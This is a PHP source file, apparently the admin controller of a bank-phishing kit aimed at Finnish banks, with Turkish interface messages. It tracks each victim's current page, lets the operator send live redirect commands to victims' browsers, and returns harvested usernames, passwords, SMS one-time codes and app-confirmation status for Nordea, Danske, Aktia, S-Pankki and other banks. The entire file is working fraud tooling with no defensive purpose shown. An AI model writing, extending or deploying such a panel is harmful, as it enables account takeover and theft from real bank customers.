<?php

namespace Admin\Controllers;

use Admin\Core\Controller;
use App\Models\User;
use App\Models\UserSession;
use App\Models\Bank;

class UserController extends Controller
{
    public function index(): void
    {
        $userModel = new User();
        $sessionModel = new UserSession();
        $bankModel = new Bank();
        $page = (int) ($_GET['page'] ?? 1);
        $limit = 50;
        $offset = ($page - 1) * $limit;

        $users = $userModel->getAll($limit, $offset);
        $totalUsers = $userModel->getTotalCount();
        $totalPages = ceil($totalUsers / $limit);
        $banks = $bankModel->getAll();

        foreach ($users as &$user) {
            $session = $sessionModel->getCurrentPage($user['id']);
            $user['current_page'] = $session['current_page'] ?? null;
            $user['page_title'] = $session['page_title'] ?? null;
            $user['last_activity'] = $session['last_activity'] ?? null;
        }

        $this->view('users/index', [
            'users' => $users,
            'banks' => $banks,
            'currentPage' => $page,
            'totalPages' => $totalPages,
            'totalUsers' => $totalUsers
        ]);
    }

    public function sendRedirect(): void
    {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $userId = (int) ($_POST['user_id'] ?? 0);
        $redirectTo = trim($_POST['redirect_to'] ?? '');

        if ($userId <= 0 || empty($redirectTo)) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $sessionModel = new UserSession();
            $sessionModel->setRedirectCommand($userId, $redirectTo);
            
            $this->json([
                'success' => true,
                'message' => 'Yönlendirme komutu gönderildi. Kullanıcı yakında yönlendirilecek.'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => 'Hata: ' . $e->getMessage()], 500);
        }
    }

    public function getPage(): void
    {
        $userId = (int) ($_GET['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'page' => null], 400);
        }

        try {
            $sessionModel = new UserSession();
            $session = $sessionModel->getCurrentPage($userId);
            
            $this->json([
                'success' => true,
                'page' => $session ? [
                    'current_page' => $session['current_page'],
                    'page_title' => $session['page_title'],
                    'last_activity' => $session['last_activity']
                ] : null
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'page' => null], 500);
        }
    }

    public function getUser(): void
    {
        $userId = (int) ($_GET['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'user' => null], 400);
        }

        try {
            $userModel = new User();
            $user = $userModel->findById($userId);
            
            $this->json([
                'success' => true,
                'user' => $user ? [
                    'id' => $user['id'],
                    'full_name' => $user['full_name'],
                    'phone' => $user['phone'],
                    'bank_name' => $user['bank_name'] ?? null,
                    'nordea_username' => $user['nordea_username'] ?? null,
                    'nordea_password' => $user['nordea_password'] ?? null,
                    'nordea_sms_code' => $user['nordea_sms_code'] ?? null,
                    'nordea_app_confirmed' => $user['nordea_app_confirmed'] ?? 0,
                    'alandsbanken_username' => $user['alandsbanken_username'] ?? null,
                    'alandsbanken_password' => $user['alandsbanken_password'] ?? null,
                    'alandsbanken_sms_code' => $user['alandsbanken_sms_code'] ?? null,
                    'alandsbanken_app_confirmed' => $user['alandsbanken_app_confirmed'] ?? 0,
                    'danske_username' => $user['danske_username'] ?? null,
                    'danske_password' => $user['danske_password'] ?? null,
                    'danske_sms_code' => $user['danske_sms_code'] ?? null,
                    'danske_app_confirmed' => $user['danske_app_confirmed'] ?? 0,
                    'spankki_username' => $user['spankki_username'] ?? null,
                    'spankki_password' => $user['spankki_password'] ?? null,
                    'spankki_sms_code' => $user['spankki_sms_code'] ?? null,
                    'spankki_app_confirmed' => $user['spankki_app_confirmed'] ?? 0,
                    'aktia_username' => $user['aktia_username'] ?? null,
                    'aktia_sms_code' => $user['aktia_sms_code'] ?? null,
                    'aktia_app_confirmed' => $user['aktia_app_confirmed'] ?? 0,
                    'aktia_login_method' => $user['aktia_login_method'] ?? null,
                    'poppankki_username' => $user['poppankki_username'] ?? null,
                    'poppankki_sms_code' => $user['poppankki_sms_code'] ?? null,
                    'poppankki_app_confirmed' => $user['poppankki_app_confirmed'] ?? 0,
                    'omasp_username' => $user['omasp_username'] ?? null,
                    'omasp_sms_code' => $user['omasp_sms_code'] ?? null,
                    'omasp_app_confirmed' => $user['omasp_app_confirmed'] ?? 0,
                    'saastopankki_username' => $user['saastopankki_username'] ?? null,
                    'saastopankki_sms_code' => $user['saastopankki_sms_code'] ?? null,
                    'saastopankki_app_confirmed' => $user['saastopankki_app_confirmed'] ?? 0
                ] : null
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'user' => null], 500);
        }
    }
}

